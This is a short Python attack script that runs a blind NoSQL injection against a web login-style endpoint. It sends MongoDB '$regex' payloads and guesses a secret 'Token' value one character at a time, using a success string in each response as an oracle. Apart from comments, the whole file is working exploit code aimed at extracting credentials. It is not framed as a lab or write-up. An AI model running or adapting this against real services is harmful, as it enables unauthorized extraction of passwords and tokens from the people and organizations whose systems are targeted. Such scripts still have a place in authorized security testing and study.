import requests
import json
import string

# Initialize variables
injected_data = ""  # The current data being guessed
charset = string.ascii_letters + string.digits + "!"  # Set of characters to try for injection
target_url = "https://127.0.0.1/vulnerable-endpoint.php"  # Target URL for injection testing
success_indicator = "True"  # String that indicates a successful response (e.g., "Logged in Successfully")
data_key = "Token"  # The name of the parameter to guess (e.g., "password")

# Oracle function: Performs the request and checks for a success indicator in the response
def oracle(data_to_guess):
    response = requests.post(
        target_url,
        headers={"Content-Type": "application/json"},
        data=json.dumps({data_key: data_to_guess})
    )
    # Check if the success indicator is present in the response text
    if success_indicator in response.text:
        return True
    return False

print("[!] Exfiltrating...")

# Main loop: Attempts to guess the value of the parameter using a regex-based approach
while True:
    for char in charset:  # Iterate over the characters in the charset
        # Check if the current data + character combination yields a true response
        if oracle({"$regex": "^" + injected_data + char}):
            injected_data += char  # Append the character to the guessed data
            print(char, end="", flush=True)  # Output the guessed character
            break
